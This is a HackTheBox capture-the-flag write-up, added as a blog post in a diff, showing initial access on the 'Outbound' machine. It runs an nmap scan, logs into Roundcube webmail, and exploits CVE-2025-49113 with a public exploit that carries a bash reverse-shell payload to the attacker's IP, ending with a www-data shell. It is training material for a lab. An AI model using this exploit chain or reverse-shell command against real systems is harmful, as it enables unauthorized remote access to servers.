@@ -1,0 +1,48 @@
+---
+title: "Outbound HacktheBox Writeup"
+date: "Jul 29, 2025"
+description: "Detailed writeup for Outbound HacktheBox"
+image: "/images/outbound.png"
+---
+
+Kicking off my return to HackTheBox after a long break, I stumbled upon an intriguing new machine—Outbound. Ready to dust off my hacking skills, I jumped straight into action by quickly setting up the VPN connection:
+
+sudo openvpn outbound.ovpn
+
+
+i poked at the box with an Nmap scan:
+
+```bash
+nmap -sC -sV -oN scan.txt 10.10.11.77
+```
+Here's the result of the scan:
+![namp](/outbound.png)
+
+I discovered two open ports: 22 (SSH) and 80 (HTTP).
+
+Visiting http://10.10.11.77 redirected me to mail.outbound.htb, so I added the following line to my /etc/hosts file:
+
+```bash
+10.10.11.77 mail.outbound.htb
+```
+
+After refreshing the page, I reached a Roundcube webmail login. Interestingly, the login credentials were provided directly on the page:
+![machine](/htb.png)
+After logging in, I quickly noticed the Roundcube version had a vulnerability: CVE-2025-49113.
+(Quick reminder: Always check the software version for known CVEs!)
+
+Next, I started a listener on my attacker machine:
+
+```bash
+nc -nlvp 4444
+```
+Then, on the target, I cloned the exploit repository and executed the exploit:
+
+```bash
+git clone https://github.com/fearsoff-org/CVE-2025-49113.git
+cd CVE-2025-49113
+php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/10.10.16.32/4444 0>&1'"
+```
+Now, with a shell as www-data amd you can see the exploit executed sucessfully 
+
+![www-data](/htb2.png)
